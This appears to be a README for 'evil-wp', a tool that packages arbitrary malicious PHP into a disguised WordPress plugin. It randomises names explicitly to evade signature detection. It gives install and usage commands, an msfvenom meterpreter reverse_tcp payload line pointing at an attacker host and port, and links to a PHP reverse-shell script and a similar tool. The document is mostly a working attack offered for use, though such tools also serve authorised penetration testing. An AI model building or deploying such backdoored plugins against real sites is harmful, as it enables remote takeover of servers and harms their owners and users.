# evil-wp
This is a small project to wrap malicous PHP payloads into a WordPress plugin.

Random name generation is thrown in for fun and a slight attempt at reducing detection by template pattern matching.

## Pre-Requisites
This attack requires the ability to install plugins to the target WordPress installation.

## Installation
To install this simple tool, clone this repository and use pip to install the requirements.

``` bash
$ git clone https://github.com/svespie/evil-wp
$ cd evil-wp
$ pip install -r requirements.txt
```

Consider using a virtual environment as a matter of best practice.

## Usage
``` bash
$ python evil-wp.py -h
$ python evil-wp.py -n <plugin_name> -p "<payload>"
```

* the plugin name should be unique to the installation being attacked
* the payload can be any valid PHP code


## Example Payload Generation
msfvenom is a great place to start with for generating PHP payloads.

``` bash
$ msfconsole -p php/meterpreter/reverse_tcp LHOST=<attacker_host LPORT=<listening_port> -e php/base64 -f raw
```

Any valid PHP will work, including traditional PHP reverse shell payloads such as this one: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php.

Note: the payload is inserted into a PHP template. There is no need to include PHP opening and closing tags.

Good luck!

## Similar Projects
* https://github.com/wetw0rk/malicious-wordpress-plugin/blob/master/wordpwn.py (a nifty tool that automates meterpreter use but with less payload flexibility)